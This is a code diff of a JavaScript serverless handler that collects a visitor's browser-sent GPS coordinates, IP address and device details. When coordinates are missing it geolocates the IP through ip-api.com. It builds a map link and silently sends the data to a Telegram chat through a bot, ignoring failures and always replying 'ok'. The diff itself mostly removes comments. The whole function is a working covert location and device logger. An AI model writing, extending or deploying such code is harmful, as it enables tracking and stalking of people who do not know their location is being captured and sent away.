@@ -21,7 +21,6 @@ exports.handler = async function(event) {
   let body = {};
   try { body = event.body ? JSON.parse(event.body) : {}; } catch(e){ body = {}; }
 
-  // prefer client-sent coords and clientIp (from the browser)
   const coords = body.coords || null;
   const client_ip = (body.clientIp && body.clientIp !== '') ? body.clientIp
     : (headers['x-nf-client-connection-ip'] || (headers['x-forwarded-for'] ? headers['x-forwarded-for'].split(',')[0].trim() : '') || 'unknown');
@@ -36,7 +35,7 @@ exports.handler = async function(event) {
     text += `Coordinates: ${coords.lat},${coords.lon} (accuracy: ${coords.accuracy || 'n/a'} m)\n`;
     text += `Map: https://www.google.com/maps/search/?api=1&query=${coords.lat},${coords.lon}\n`;
   } else {
-    // fallback: use an IP geolocation lookup (ip-api.com free)
+    // fallback to IP geolocation
     if (client_ip && client_ip !== 'unknown') {
       const url = `http://ip-api.com/json/${encodeURIComponent(client_ip)}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,proxy,message`;
       const geo = await fetchJson(url);
@@ -54,13 +53,12 @@ exports.handler = async function(event) {
     }
   }
 
-  // Append some optional browser/device info from body (if present)
   if (body.deviceMemory) text += `RAM: ${body.deviceMemory} GB\n`;
   if (body.hardwareConcurrency) text += `CPU cores: ${body.hardwareConcurrency}\n`;
   if (body.timezone) text += `TZ: ${body.timezone}\n`;
   if (body.connection) text += `Network: ${JSON.stringify(body.connection)}\n`;
 
-  // Send to Telegram (best-effort)
+  // send to Telegram
   if (process.env.TG_BOT_TOKEN && process.env.TG_CHAT_ID) {
     try {
       const payload = JSON.stringify({ chat_id: process.env.TG_CHAT_ID, text });
@@ -71,17 +69,14 @@ exports.handler = async function(event) {
       };
       await new Promise((resolve) => {
         const req = https.request(options, (res) => {
-          // drain response
-          res.on('data', ()=>{});
-          res.on('end', ()=>resolve());
+          res.on('data', ()=>{}); res.on('end', ()=>resolve());
         });
         req.on('error', ()=>resolve());
         req.write(payload);
         req.end();
       });
-    } catch(e){ /* ignore failures, we still return 200 */ }
+    } catch(e){}
   }
 
-  // Return OK quickly
   return { statusCode: 200, body: 'ok' };
 };
